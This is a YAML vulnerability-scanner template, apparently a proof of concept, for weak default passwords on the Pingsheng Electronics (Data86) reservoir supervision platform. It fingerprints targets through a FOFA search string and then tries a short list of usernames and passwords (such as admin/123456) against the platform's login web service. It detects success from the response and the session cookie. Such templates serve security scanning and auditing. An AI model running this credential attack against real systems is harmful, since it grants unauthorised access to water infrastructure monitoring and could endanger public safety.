id: poc-yaml-data86-reservoir-supervision-platform-weak-password
info:
  name: 平升电子水库监管平台 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: 水库监管平台
  fofa: js/PSExtend.js
variables:
  name: 'Data86

    admin

    '
  passwd: 'Data86

    123456

    123

    '
firstRequest:
  method: GET
  path: /
  expression: 'status_code == 200 && contains(body,"src=\"js/PSExtend.js\"")

    '
requests:
- method: POST
  path: /WebServices/UserAdminService.asmx/LoginEx3
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: LoginName={{.name}}&LoginPwd={{.passwd}}&isRemember=false
  expression: status_code == 200 && contains(body,"\"Result\":true") && contains(body,"\"Message\":\"登陆成功\"")
    && contains(headers,"userinfoadmin=")
transport: http
